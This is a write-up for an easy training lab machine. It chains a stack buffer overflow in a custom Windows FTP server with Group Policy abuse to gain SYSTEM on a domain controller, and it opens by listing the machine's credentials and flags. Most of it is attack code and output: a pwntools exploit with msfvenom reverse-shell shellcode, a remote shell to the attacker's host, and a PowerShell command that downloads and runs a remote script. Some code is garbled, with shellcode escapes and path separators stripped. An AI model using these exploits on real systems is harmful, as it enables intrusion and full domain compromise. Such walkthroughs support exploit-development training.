_____

## Description

(Easy) EXP-301 related Machine. Involves a stack overflow followed by a GPO Abuse.

## Credentials

- administrator: UphillGravelVowed55
- support: SmasherHydrogenSafeness21
- ftp: admin:SafariDozeDust17

## Flags

- proof.txt: 095de629bce9df249225293b07777f30
- local.txt: 3fd4730b1d98b8ac1df0d50b81ec5d03

## Walkthrough

Perform a portscan:

```
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-11 17:47 CEST
Nmap scan report for 192.168.247.156
Host is up (0.00021s latency).
Not shown: 984 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp?
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-08-11 15:47:47Z)
111/tcp  open  rpcbind       2-4 (RPC #100000)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: Kyotosoft.com0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
2049/tcp open  nlockmgr      1-4 (RPC #100021)
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: Kyotosoft.com0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
5357/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)

Nmap done: 1 IP address (1 host up) scanned in 58.61 seconds
```

We see it's a domain controller. Let's perform anonymous SMB enumeration:

```
smbclient -L \\192.168.247.156
Password for [WORKGROUPxct]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	dev             Disk      development & debugging share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share
	SYSVOL          Disk      Logon server share
	```

Try to access the dev share anonymously & download the binary from there:
```

smbclient \192.168.247.156\dev Password for [WORKGROUPxct]: Try "help" to get a list of possible commands. smb: > ls . D 0 Tue Aug 8 22:39:28 2023 .. DHS 0 Wed Aug 9 19:20:08 2023 .git D 0 Tue Aug 8 22:39:26 2023 DEVLOG.txt A 155 Tue Aug 8 22:37:16 2023 smb: > get ftp.exe ...

```

Analyze the custom ftp server in IDA/Ghidra and find a credential string "admin:SafariDozeDust17" and that the login function is vulnerable to a buffer overflow. This binary does not use ASLR or DEP.

```

bool __cdecl FUN_004011b0(char *param_1,undefined4 *param_2)

{ int iVar1; undefined4 *puVar2; undefined local_114 [256]; int local_14; char *local_10; char *local_c; char local_5;

_memset(local_114,0,0xff); FUN_00401100((undefined ****)local_114,(int)&DAT_004242f8); local_c = param_1; local_10 = param_1 + 1; do { local_5 = *local_c; local_c = local_c + 1; } while (local_5 != '�'); local_14 = (int)local_c - (int)local_10; puVar2 = (undefined4 *)(local_114 + local_14 + 1); for (iVar1 = 0x200; iVar1 != 0; iVar1 = iVar1 + -1) { *puVar2 = *param_2; param_2 = param_2 + 1; puVar2 = puVar2 + 1; } FUN_00401050((int)"[DEBUG] Credential: %s "); iVar1 = _strncmp(local_114,"admin:SafariDozeDust17",0x16); return iVar1 == 0; }

```

The vulnerability is in the 0x200 copy from the function param (the password) into the local variable which only holds 0x100 bytes. This means a long password will overflow the buffer and overwrite the return address. Sending a pattern will show the offset. 

We generate a pattern:
```

sf-pattern_create -l 1000 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0A...

```

We run the script and observe the output in windbg:
```

from pwn import *

pattern = b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B"

# Login

p = remote('192.168.247.156', 21, level='debug') p.recvuntil(b"220") p.sendline(b"USER Banana") p.recvuntil(b"331") p.sendline(b"PASS "+pattern) p.recvuntil(b"430") p.interactive()

eip=41306a41

```

This allows to find the offset:
```

msf-pattern_offset -l 1000 -q 41306a41 [*] Exact match at offset 270

```

We want to execute shellcode which is on the stack. This means we need to overwrite the return address at offset 270 with a gadget that will jump to the stack:

```

(SimpleFTP.exe/PE/x86)> search jmp esp [INFO] Searching for gadgets: jmp esp

(SimpleFTP.exe/PE/x86)> search pop esp [INFO] Searching for gadgets: pop esp

[INFO] File: SimpleFTP.exe 0x00414898: pop esp; add byte ptr [eax], al; pop ecx; ret; 0x00414892: pop esp; add byte ptr [eax], al; push eax; call 0x1a4f0; pop ecx; ret; 0x0041baa5: pop esp; and al, 4; fld qword ptr [esp + 4]; ret; 0x00401f83: pop esp; inc edi; inc edx; add byte ptr [ebp - 0x9cf7b], cl; call dword ptr [eax - 0x18]; 0x004173ff: pop esp; or byte ptr [eax], ch; push dword ptr [esi]; call 0x11762; pop ecx; ret;

(SimpleFTP.exe/PE/x86)> search call esp [INFO] Searching for gadgets: call esp

[INFO] File: SimpleFTP.exe 0x004016be: call esp;

```

There is no `jmp esp`, however we find a few pop gadgets. Those have some undesired side effects so they are not ideal - there is also a `call esp` gadget which is perfect as it has no negative side effects. We update the script to include shellcode and the gadget we identified. This gives a shell on the machine:

```

from pwn import *

# msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=192.168.247.131 LPORT=443 -f python -v sc

sc = b"" sc += b"xfcxe8x82x00x00x00x60x89xe5x31xc0x64" sc += b"x8bx50x30x8bx52x0cx8bx52x14x8bx72x28" sc += b"x0fxb7x4ax26x31xffxacx3cx61x7cx02x2c" sc += b"x20xc1xcfx0dx01xc7xe2xf2x52x57x8bx52" sc += b"x10x8bx4ax3cx8bx4cx11x78xe3x48x01xd1" sc += b"x51x8bx59x20x01xd3x8bx49x18xe3x3ax49" sc += b"x8bx34x8bx01xd6x31xffxacxc1xcfx0dx01" sc += b"xc7x38xe0x75xf6x03x7dxf8x3bx7dx24x75" sc += b"xe4x58x8bx58x24x01xd3x66x8bx0cx4bx8b" sc += b"x58x1cx01xd3x8bx04x8bx01xd0x89x44x24" sc += b"x24x5bx5bx61x59x5ax51xffxe0x5fx5fx5a" sc += b"x8bx12xebx8dx5dx68x33x32x00x00x68x77" sc += b"x73x32x5fx54x68x4cx77x26x07xffxd5xb8" sc += b"x90x01x00x00x29xc4x54x50x68x29x80x6b" sc += b"x00xffxd5x50x50x50x50x40x50x40x50x68" sc += b"xeax0fxdfxe0xffxd5x97x6ax05x68xc0xa8" sc += b"xf7x89x68x02x00x01xbbx89xe6x6ax10x56" sc += b"x57x68x99xa5x74x61xffxd5x85xc0x74x0c" sc += b"xffx4ex08x75xecx68xf0xb5xa2x56xffxd5" sc += b"x68x63x6dx64x00x89xe3x57x57x57x31xf6" sc += b"x6ax12x59x56xe2xfdx66xc7x44x24x3cx01" sc += b"x01x8dx44x24x10xc6x00x44x54x50x56x56" sc += b"x56x46x56x4ex56x56x53x56x68x79xccx3f" sc += b"x86xffxd5x89xe0x4ex56x46xffx30x68x08" sc += b"x87x1dx60xffxd5xbbxf0xb5xa2x56x68xa6" sc += b"x95xbdx9dxffxd5x3cx06x7cx0ax80xfbxe0" sc += b"x75x05xbbx47x13x72x6fx6ax00x53xffxd5"

buf = b"" buf += b"A"*270 buf += p32(0x004016be) buf += sc

# Login

p = remote('192.168.247.156', 21, level='debug') p.recvuntil(b"220") p.sendline(b"USER Banana") p.recvuntil(b"331") p.sendline(b"PASS "+buf) p.recvuntil(b"430")

p.interactive()

nc -lnvp 443 listening on [any] 443 ... connect to [192.168.247.137] from (UNKNOWN) [192.168.247.156] 59412 Microsoft Windows [Version 10.0.20348.1906] (c) Microsoft Corporation. All rights reserved.

C:Windowssystem32>

```

We check our privileges and notice we are in the "KYOTOSOFTGPO Admins" group. This group suggests that we can add and possibly link new GPOs to the domain. This will allow us to escalate privileges using https://github.com/FSecureLABS/SharpGPOAbuse. We download the repo & compile the tool, then execute the attack. Before running it, we host a run.txt file on our machine that contains a powershell reverse shell:  

```

powershell -c "iwr http://192.168.247.137/SharpGPOAbuse.exe -o SharpGPOAbuse.exe"

SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --Author KYOTOSOFTAdmin --Command "cmd.exe" --Arguments "/c powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://192.168.247.137/run.txt'))"" --GPOName "Default Domain Policy"

[+] Domain = kyotosoft.com [+] Domain Controller = kyoto.Kyotosoft.com [+] Distinguished Name = CN=Policies,CN=System,DC=Kyotosoft,DC=com [+] GUID of "Default Domain Policy" is: {31B2F340-016D-11D2-945F-00C04FB984F9} [+] Creating file \kyotosoft.comSysVolkyotosoft.comPolicies{31B2F340-016D-11D2-945F-00C04FB984F9}MachinePreferencesScheduledTasksScheduledTasks.xml [+] versionNumber attribute changed successfully [+] The version number in GPT.ini was increased successfully. [+] The GPO was modified to include a new immediate task. Wait for the GPO refresh cycle. [+] Done! ... gupupdate /force

```

This creates & links a new GPO that will then download & execute our run.txt, resulting in a shell as SYSTEM:

```

nc -lnvp 443 listening on [any] 443 ... connect to [192.168.247.137] from (UNKNOWN) [192.168.247.156] 63224 whoami nt authoritysystem
